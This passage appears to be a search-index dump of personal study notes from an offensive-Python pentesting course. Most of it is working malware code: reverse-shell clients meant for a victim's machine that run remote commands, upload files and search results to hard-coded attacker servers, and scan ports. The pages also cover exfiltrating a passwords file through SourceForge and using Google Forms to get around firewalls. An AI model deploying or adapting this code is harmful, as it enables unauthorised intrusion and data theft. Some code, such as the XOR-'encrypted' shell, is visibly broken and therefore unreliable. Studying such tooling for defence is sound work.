\" + message + '\\n')\n\n\n# here i defined a dedicated function called str_xor, we will pass two values to this fucntion, the first value is the message(s1) that we want to encrypt or decrypt, and the second paramter is the xor key(s2). We were able to bind the encryption and the decryption phases in one function because the xor operation is exactly the same when we encrypt or decrpyt, the only difference is that when we encrypt we pass the message in clear text and when we want to decrypt we pass the encrypted message\n\n\ndef str_xor(s1, s2):\n    return \"\".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1,s2)])\n\n\n# first we split the message and the xor key to a list of character pair in tuples format &gt;&gt;  for (c1,c2) in zip(s1,s2)\n\n# next we will go through each tuple, and converting them to integer using (ord) function, once they converted into integers we can now perform exclusive OR on them  &gt;&gt;  ord(c1) ^ ord(c2)\n\n# then convert the result back to ASCII using (chr) function  &gt;&gt;  chr(ord(c1) ^ ord(c2))\n# last step we will merge the resulting array of characters as a sequqnece string using &gt;&gt;&gt;  \"\".join function \n\nenc = str_xor(message, key)\n\nprint(\"Encrypted message is \" + \"\\n\" + enc + \"\\n\")\n\ndec = str_xor(enc, key)\nprint(\"Decrypted message is \" + \"\\n\" + dec + \"\\n\")\n</code></pre> <p>To integrate XOR encryption into this client side Python script, you can modify the script to encrypt and decrypt the communication between the client and the server using the XOR encryption algorithm.</p> <p>Here is an example of how to modify the script to incorporate XOR encryption:</p> <pre><code>import string\nimport random\nimport requests\nimport os\nimport subprocess\nimport time\n\n# Random Key Generator\nkey = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\\$%&amp;/()=?{[]}+~#-_.:,;&lt;&gt;|\\\\') for _ in range(0, 1024))\n\n# Define XOR function\ndef str_xor(s1, s2):\n    return \"\".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1,s2)])\n\nwhile True:\n    # Send GET request to C&amp;C server to get command\n    req = requests.get('http://192.168.0.152:8080')\n    command = req.text\n\n    # If command is to terminate, break out of loop\n    if 'terminate' in command:\n        break\n\n    # If command is to grab a file and send it to the C&amp;C server\n    elif 'grab' in command:\n        grab, path = command.split(\"*\")\n        if os.path.exists(path):\n            url = \"http://192.168.0.152:8080/store\"\n            filer = {'file': open(path, 'rb')}\n            r = requests.post(url, files=filer)\n        else:\n            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())\n\n    # If command is to search for files with a specific extension\n    elif 'search' in command:\n        # Split command into path and file extension\n        command = command[7:] #cut off the the first 7 character ,, output would be  C:\\\\*.pdf\n        path, ext = command.split('*')\n        lists = '' # here we define a string where we will append our result on it\n\n        # Walk through directories and search for files with specified extension\n        for dirpath, dirname, files in os.walk(path):\n            for file in files:\n                if file.endswith(ext):\n                    lists = lists + '\\n' + os.path.join(dirpath, file)\n        requests.post(url='http://192.168.0.152:8080', data=lists)\n\n    # If command is a shell command, execute it and send output to the C&amp;C server\n    else:\n        # Encrypt command with XOR key\n        enc = str_xor(command, key)\n\n        # Execute encrypted command and capture stdout and stderr\n        CMD = subprocess.Popen(enc, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        post_response = requests.post(url='http://192.168.0.152:8080', data=str_xor(CMD.stdout.read(), key))\n        post_response = requests.post(url='http://192.168.0.152:8080', data=str_xor(CMD.stderr.read(), key))\n\n    time.sleep(3)\n</code></pre>","tags":["python","python pentesting","scripting","ips","xor encryption"]},{"location":"python/bypassing-next-generation-firewalls/","title":"Bypassing Next Generation Firewalls","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul> <p>Corporate firewall (Next Generation Firewalls) can block traffic based on the reputation of the target IP/url. This means that once we achieve to execute the malicious client side script on the victim's machine, this next generation firewall might block/defer the connection if the reputation or the rank of the target URL/IP belongs to a pool of resources supplied by the vendor and it's categorized as low.</p> <p>To overcome this filter, modern malware is using trusted targets.</p>","tags":["python","python pentesting","scripting","bypassing techniques","firewall","bypassing firewall","next generation firewalls"]},{"location":"python/bypassing-next-generation-firewalls/#using-source-forge-for-data-exfiltration","title":"Using Source Forge for data exfiltration","text":"<p>1. Signup in Source Forge</p> <p>You will get credentials for configuring your SFTP agent in step 3.</p> <p>2. Install filezilla. It will work as our SFTP agent: </p> <pre><code>sudo apt-get install filezilla\n</code></pre> <p>3. Configure filezilla and connect. <pre><code>Host: web.sourceforge.net\nusername: usernameinSourceForge\npassword: passwordinSourceForge\nport: 22\n</code></pre></p> <p>4. Install these two python libraries on the victim's machine: paramiko and scp.</p> <pre><code>pip install paramiko\npip install scp\n</code></pre> <p>5. Run the script on the victim's machine:</p> <pre><code>'''\nCaution\n--------\nUsing this script for any malicious purpose is prohibited and against the law. Please read SourceForge terms and conditions carefully. \nUse it on your own risk. \n'''\n\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nimport paramiko\nimport scp\n\n# File Management on SourceForge \n# [+] https://sourceforge.net/p/forge/documentation/File%20Management/\n\n\nssh_client = paramiko.SSHClient() # creating an ssh_client instance using paramiko sshclient class\n\nssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\nssh_client.connect(\"web.sourceforge.net\", username=\"myusernameatSourceForge\", password=\"PASSWORD HERE\") #Authenticate ourselves to the sourceforge. Server, user and password from step 1\nprint (\"[+] Authenticating against web.sourceforge.net\")\n\nscp = scp.SCPClient(ssh_client.get_transport()) #after a sucessful authentication the ssh session id will be passed into SCPClient function\n\nscp.put(\"C:/Users/Alex/Desktop/passwords.txt\") # upload a file, for instance password.txt\nprint (\"[+} File is uploaded\")\n\nscp.close()\n\nprint(\"[+] Closing the socket\")\n</code></pre>","tags":["python","python pentesting","scripting","bypassing techniques","firewall","bypassing firewall","next generation firewalls"]},{"location":"python/bypassing-next-generation-firewalls/#using-google-forms-for-submitting-output","title":"Using Google Forms for submitting output","text":"<p>1. Create a Google Form with a quick test and copy the link of the survey.</p> <p>2. Copy the name of the form from the source code of the google form.</p> <p></p> <p>3. Paste URL of the survey +  name of the form in the script:</p> <pre><code>'''\nCaution\n--------\nUsing this script for any malicious purpose is prohibited and against the law. Please read Google terms and conditions carefully. \nUse it on your own risk. \n'''\n\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\n\nimport requests\n\nurl = 'https://docs.google.com/forms/d/1Ndjnm5YViqIYXyIuoTHsCqW_YfGa-vaaKEahY2cc5cs/formResponse'\n\nform_data = {'entry.1301128713':'Lets see how we can use this, in the next exercise'}\n\nr = requests.post(url, data=form_data)\n\n# Submitting form-encoded data in requests:-\n# http://docs.python-requests.org/en/latest/user/quickstart/#more-complicated-post-requests\n</code></pre>","tags":["python","python pentesting","scripting","bypassing techniques","firewall","bypassing firewall","next generation firewalls"]},{"location":"python/bypassing-next-generation-firewalls/#exercise","title":"Exercise","text":"<pre><code>Try to combine the above ideas (Google Form + Twitter + SourceForge) Into a single script and see if you can control your target without direct interaction.\n</code></pre>","tags":["python","python pentesting","scripting","bypassing techniques","firewall","bypassing firewall","next generation firewalls"]},{"location":"python/coding-a-data-exfiltration-script-http-shell/","title":"Coding a data exfiltration script for a http shell","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-data-exfiltration-script-http-shell/#client-side","title":"Client side","text":"<p>To be run on victim's computer.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nimport requests\nimport os\nimport subprocess\nimport time\n\nwhile True:\n\n    req = requests.get('http://192.168.0.152:8080')\n    command = req.text\n    if 'terminate' in command:\n        break\n\n\n# Now similar to what we have done in our TCP reverse shell, we check if file exisit in the first place, if not then we \n# notify our attacker that we are unable to find the file, but if the file is there then we will :-\n# 1.Append /store in the URL\n# 2.Add a dictionary key called 'file'\n# 3.requests library use POST method called \"multipart/form-data\" when submitting files\n\n#All of the above points will be used on the server side to distinguish that this POST is for submitting a file NOT a usual command output. Please see the server script for more details on how we can use these points to get the file\n\n\n    elif 'grab' in command:\n        grab, path = command.split(\"*\")\n        if os.path.exists(path): # check if the file is there\n            url = \"http://192.168.0.152:8080/store\" # Appended /store in the URL\n            files = {'file': open(path, 'rb')} # Add a dictionary key called 'file' where the key value is the file itself\n            r = requests.post(url, files=files) # Send the file and behind the scenes, requests library use POST method called \"multipart/form-data\"\n        else:\n            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())\n    else:\n        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())\n        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())\n    time.sleep(3)\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-data-exfiltration-script-http-shell/#server-side","title":"Server side","text":"<pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nimport http.server\nimport os, cgi\n\nHOST_NAME = '10.0.2.15'\nPORT_NUMBER = 8080\n\nclass MyHandler(http.server.BaseHTTPRequestHandler):\n\n    def do_GET(self):\n\n        command = input(\"Shell&gt; \")\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(command.encode())\n\n    def do_POST(self):\n\n        #Here we will use the points which we mentioned in the Client side, as a start if the \"/store\" was in the URL then this is a POST used for file transfer so we will parse the POST header, if its value was 'multipart/form-data' then we will pass the POST parameters to FieldStorage class, the \"fs\" object contains the returned values from FieldStorage in dictionary fashion.\n\n        if self.path == '/store':\n            try:\n                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))\n                if ctype == 'multipart/form-data':\n                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})\n                else:\n                    print('[-]Unexpected POST request')\n                fs_up = fs['file'] # Remember, on the client side we submitted the file in dictionary fashion, and we used the key 'file'\n                with open('/home/kali/place_holder.txt', 'wb') as o: # create a file holder called 'placer_holder.txt' and write the received file into this 'place_holder.txt'. After the operation you need to rename this file to the original one, so the extention gets recognized. \n                    print('[+] Writing file ..')\n                    o.write(fs_up.file.read())\n                    self.send_response(200)\n                    self.end_headers()\n            except Exception as e:\n                print(e)\n            return\n        self.send_response(200)\n        self.end_headers()\n        length = int(self.headers['Content-length'])\n        postVar = self.rfile.read(length)\n        print(postVar.decode())\n\nif __name__ == '__main__':\n    server_class = http.server.HTTPServer\n    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)\n    try:\n        httpd.serve_forever()\n    except KeyboardInterrupt:\n        print ('[!] Server is terminated')\n        httpd.server_close()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-low-level-data-exfiltration-tcp/","title":"Coding a low level data exfiltration  - TCP connection","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-low-level-data-exfiltration-tcp/#client","title":"Client","text":"<p>To be run on victim's computer.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\nimport socket\nimport subprocess\nimport os\n\n\n# In the transfer function, we first check if the file exists in the first place, if not we will notify the attacker\n# otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the\n# server has no idea about the end of the file we add a tag called 'DONE' to address this issue, finally we close the file\ndef transfer(s, path):\n    if os.path.exists(path):\n        f = open(path, 'rb')\n        packet = f.read(1024)\n        while len(packet) &gt; 0:\n            s.send(packet)\n            packet = f.read(1024)\n        s.send('DONE'.encode())\n    else:\n        s.send('File not found'.encode())\ndef connecting():\n    s = socket.socket()\n    s.connect((\"10.0.2.15\", 8080))\n\n    while True:\n        command = s.recv(1024)\n\n        if 'terminate' in command.decode():\n            s.close()\n            break\n\n\n# if we received grab keyword from the attacker, then this is an indicator for file transfer operation, hence we will split the received commands into two parts, the second part which we intersted in contains the file path, so we will store it into a varaible called path and pass it to transfer function\n\n# Remember the Formula is  grab*&lt;File Path&gt;\n# Absolute path example:  grab*C:\\Users\\Hussam\\Desktop\\photo.jpeg\n        elif 'grab' in command.decode():\n            grab, path = command.decode().split(\"*\")\n            try:\n                transfer(s, path)\n            except:\n                pass\n        else:\n            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n            s.send(CMD.stderr.read())\n            s.send(CMD.stdout.read())\ndef main():\n    connecting()\nmain()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-low-level-data-exfiltration-tcp/#server","title":"Server","text":"<p>To be run on attacker's computer.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\nimport os\nimport socket\n\ndef transfer(conn, command):\n    conn.send(command.encode())\n    grab, path = command.split(\"*\")\n    f = open('/home/kali/'+path, 'wb')\n    while True:\n        bits = conn.recv(2048)\n        if bits.endswith('DONE'.encode()):\n            f.write(bits[:-4]) # Write those last received bits without the word 'DONE' \n            f.close()\n            print ('[+] Transfer completed ')\n            break\n        if 'File not found'.encode() in bits:\n            print ('[-] Unable to find out the file')\n            break\n        f.write(bits)\ndef connecting():\n    s = socket.socket()\n    s.bind((\"10.0.2.15\", 8080))\n    s.listen(1)\n    print('[+] Listening for income TCP connection on port 8080')\n    conn, addr = s.accept()\n    print('[+]We got a connection from', addr)\n\n    while True:\n        command = input(\"Shell&gt; \")\n        if 'terminate' in command:\n            conn.send('terminate'.encode())\n            break\n        elif 'grab' in command:\n            transfer(conn, command)\n        else:\n            conn.send(command.encode())\n            print(conn.recv(1024).decode())\ndef main():\n    connecting()\nmain()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-low-level-data-exfiltration-tcp/#using-pyinstaller","title":"Using pyinstaller","text":"<p>See pyinstaller.</p>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-reverse-shell-that-scans-ports/","title":"Coding a reverse shell that scans ports","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell","port scanner"]},{"location":"python/coding-a-reverse-shell-that-scans-ports/#client-side","title":"Client side","text":"<p>To be run on the victim's machine.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\nimport os\nimport socket\nimport subprocess\n\ndef transfer(s, path):\n    if os.path.exists(path):\n        f = open(path, 'rb')\n        packet = f.read(1024)\n        while packet:\n            s.send(packet)\n            packet = f.read(1024)\n        s.send('DONE'.encode())\n        f.close()\n\ndef scanner(s, ip, ports):\n    scan_result = '' # scan_result is a variable stores our scanning result\n    for port in ports.split(','):\n        try: # we will try to make a connection using socket library for EACH one of these ports\n            sock =  socket.socket()\n#connect_ex This function returns 0 if the operation succeeded,  and in our case operation succeeded means that the connection happens whihch means the port is open otherwsie the port could be closed or the host is unreachable in the first place.\n            output = sock.connect_ex((ip, int(port)))\n            if output == 0:\n                scan_result = scan_result + \"[+] Port \" + port + \" is opened\" + \"\\n\"\n            else:\n                scan_result = scan_result + \"[-] Port \" + port + \" is closed\"\n                sock.close()\n        except Exception as e:\n            pass\n    s.send(scan_result.encode())\ndef connect():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('192.168.0.152', 8080))\n    while True:\n        command = s.recv(1024)\n        if 'terminate' in command.decode():\n            s.close()\n            break\n        elif 'grab' in command.decode():\n            grab, path = command.decode().split('*')\n            try:\n                transfer(s, path)\n            except:\n                s.send(str(e).encode())\n                pass\n\n        elif 'scan' in command.decode(): # syntax: scan 10.10.10.100:22,80\n            command = command[5:].decode() #slice the leading first 5 char \n            ip, ports = command.split(':')\n            scanner(s, ip, ports)\n        else:\n            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n            s.send(CMD.stdout.read())\n            s.send(CMD.stderr.read())\n\ndef main():\n    connect()\n\nmain()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","port scanner"]},{"location":"python/coding-a-reverse-shell-that-searches-files/","title":"Coding a reverse shell that searches files","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-reverse-shell-that-searches-files/#client-side","title":"Client side","text":"<p>To be run in the victim's machine.</p> <pre><code>import requests\nimport os\nimport subprocess\nimport time\n\nwhile True:\n    req = requests.get('http://192.168.0.152:8080')\n    command = req.text\n    if 'terminate' in command:\n        break\n    elif 'grab' in command:\n        grab, path = command.split(\"*\")\n        if os.path.exists(path):\n            url = \"http://192.168.0.152:8080/store\"\n            filer = {'file': open(path, 'rb')}\n            r = requests.post(url, files=filer)\n        else:\n            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())\n    elif 'search' in command: #The Formula is search &lt;path&gt;*.&lt;file extension&gt;  --&gt;for example let's say that we got search C:\\\\*.pdf\n        command = command[7:] #cut off the the first 7 character ,, output would be  C:\\\\*.pdf\n        path, ext = command.split('*')\n        lists = '' # here we define a string where we will append our result on it\n\n#os.walk is a function that will naviagate ALL the directoies specified in the provided path and returns three values:-\n#1-dirpath is a string contains the path to the directory\n#2-dirnames is a list of the names of the subdirectories in  dirpath\n#3-files is a list of the files name in dirpath\n\n#Once we got the files list, we check each file (using for loop), if the file extension was matching what we are looking for, then we add the directory path into list string.\n\n\n\n        for dirpath, dirname, files in os.walk(path):\n           for file in files:\n               if file.endswith(ext):\n                   lists = lists + '\\n' + os.path.join(dirpath, file)\n        requests.post(url='http://192.168.0.152:8080', data=lists)\n    else:\n        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())\n        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())\n    time.sleep(3)\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-tcp-reverse-shell/","title":"Coding a TCP connection and a reverse shell","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-tcp-reverse-shell/#basic-connection","title":"Basic connection","text":"<p>From eJPT study module + the book Networking computers.</p>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-tcp-reverse-shell/#client-side","title":"Client side","text":"<p>To be run on victim's computer. <pre><code>from socket import *\nserverName = \"servername or ip\"\nserverPort = 12000\n\nclientSocket = socket(AF_INET, SOCK_STREAM)\nclientSocket.connect((serverName, serverPort))\n\nsentence = str(input(\"Enter a sentence in lower case: \"))\nclientSocket.send(sentence.encode())\nmodifiedSentence = clientSocket.recv(1024)\n\nprint(\"From server: \", modifiedSentence.decode())\nclientSocket.close()\n</code></pre></p>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-tcp-reverse-shell/#server-side","title":"Server  side","text":"<pre><code>from socket import *\n\nserverPort = 12000\nserverSocket = socket(AF_INET, SOCK_STREAM)\n\nserverSocket.bind(('', serverPort))\nserverSocket.listen(1)\nprint(\"Server is ready to receive...\")\n\nwhile True:\n    connectionSocket, addr = serverSocket.accept()\n    sentence = connectionSocket.recv(1024).decode()\n    capitalizedsentence = sentence.upper()\n    connectionSocket.send(capitalizedsentence.encode())\n    connectionSocket.close()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-tcp-reverse-shell/#reverse-tcp-connection","title":"Reverse TCP connection","text":"<p>From the course: Python For Offensive PenTest: A Complete Practical  </p>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-tcp-reverse-shell/#client-side_1","title":"Client side","text":"<p>To be run on victim's computer.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nimport socket    # For Building TCP Connection\nimport subprocess # To start the shell in the system\n\ndef connect():\n    s = socket.socket()\n    s.connect(('10.0.2.6', 1234)) # Here we define the Attacker IP and the listening port\n\n    while True:\n        command = s.recv(1024) # keep receiving commands from the Kali machine, read the first KB of the tcp socket\n\n        if 'terminate' in command.decode(): # if we got terminate order from the attacker, close the socket and break the loop\n            s.close()\n            break\n        else:   # otherwise, we pass the received command to a shell process\n\n            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            s.send(CMD.stdout.read()) # send back the result\n            s.send(CMD.stderr.read()) # send back the error -if any-, such as syntax error\n\ndef main():\n    connect()\nmain()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-tcp-reverse-shell/#server-side_1","title":"Server side","text":"<p>To be run on attacker's computer.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nimport socket\n\ndef connect():\n\n    s = socket.socket()\n    s.bind((\"10.0.2.15\", 1234))\n    s.listen(1) # define the backlog size for the Queue, I made it 1 as we are expecting a single connection from a single\n    conn, addr = s.accept() # accept() function will retuen the connection object ID (conn) and will return the client(target) IP address and source port in a tuple format (IP,port)\n    print ('[+] We got a connection from', addr)\n\n    while True:\n\n        command = input(\"Shell&gt; \")\n\n        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop\n            conn.send('terminate'.encode())\n            conn.close()\n            break\n        elif '' in command: # If the user just click enter, we will send a whoami command\n            conn.send('whoami'.encode()) \n            print( 